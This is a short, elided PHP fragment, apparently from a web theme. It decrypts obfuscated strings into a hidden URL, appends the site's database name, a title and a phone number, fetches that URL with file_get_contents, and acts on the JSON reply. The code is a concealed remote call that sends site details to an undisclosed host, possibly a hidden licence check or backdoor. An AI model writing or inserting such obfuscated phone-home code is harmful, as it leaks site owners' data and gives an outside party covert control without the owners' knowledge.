...
$rq_l = decryptIt("8LcYgfAGW1OxDfULtYEvRTh0BajF1R3FTR70tSj51TE=");
...
if (tema_bootstrap() == true)
{
  ...
  $rq_s = decryptIt("btRR1G4/jl5zQQgHZwLl+Wd3CO932WZezU2mHhcP+m97M8i3nqdJhaGpr76Haw0XVcBQ0v4D/pNKwL1Deeys7g==").$database."&judul=".$j."&t=".$telepon;
  $rq_c = file_get_contents($rq_s);
  $rq_d = json_decode($rq_c, true);
  $rq_h = $rq_d[0]['s'];
  $p = decryptIt("BjMe3fGarz1naNV8hMQd1AF+RbzViONryoD7+1NT1to=");
